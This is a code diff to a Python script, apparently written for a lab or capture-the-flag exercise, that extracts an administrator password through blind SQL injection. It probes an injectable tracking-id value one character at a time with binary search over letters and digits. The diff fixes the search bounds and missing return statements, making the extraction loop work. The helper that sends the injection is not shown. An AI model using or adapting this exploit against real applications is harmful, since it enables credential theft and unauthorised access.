@@ -60,33 +60,33 @@ def find_password_char():
     for i in range(1,21):
         print(i)
         if tracking_id_inject(str(i), "< \'a"):
-            admin_password += binary_search_number(number, 0, len(number), str(i))
+            admin_password += binary_search_number(number, 0, len(number) - 1, str(i))
         else:
-            admin_password += binary_search_alpha(alpha, 0, len(alpha), str(i))
+            admin_password += binary_search_alpha(alpha, 0, len(alpha) - 1, str(i))
         print(admin_password)
     print(admin_password)
 
 def binary_search_alpha(arr, low, high, payload1):
-    mid = (low + high) // 2 - 1
-    print(mid)
-    print(type(arr[mid]))
+    mid = (low + high) // 2
+    #print(mid)
     if tracking_id_inject(payload1, "= \'" + arr[mid]):
+        print("yes")
         return arr[mid]
     elif tracking_id_inject(payload1, "> \'" + arr[mid]):
-        binary_search_alpha(arr, mid + 1, high, payload1)
+        return binary_search_alpha(arr, mid + 1, high, payload1)
     else:
-        binary_search_alpha(arr, low, mid - 1, payload1)
+        return binary_search_alpha(arr, low, mid - 1, payload1)
         
         
 def binary_search_number(arr, low, high, payload1):
     mid = (low + high) // 2
-    print(mid)
+    #print(mid)
     if tracking_id_inject(payload1, "= \'" + arr[mid]):
         return arr[mid]
     elif tracking_id_inject(payload1, "< \'" + arr[mid]):
-        binary_search_number(arr, low, mid - 1, payload1)
+        return binary_search_number(arr, low, mid - 1, payload1)
     else:
-        binary_search_number(arr, mid + 1, high, payload1)
+        return binary_search_number(arr, mid + 1, high, payload1)
 
 def test():
     tracking_id_inject("1", "= \'w")
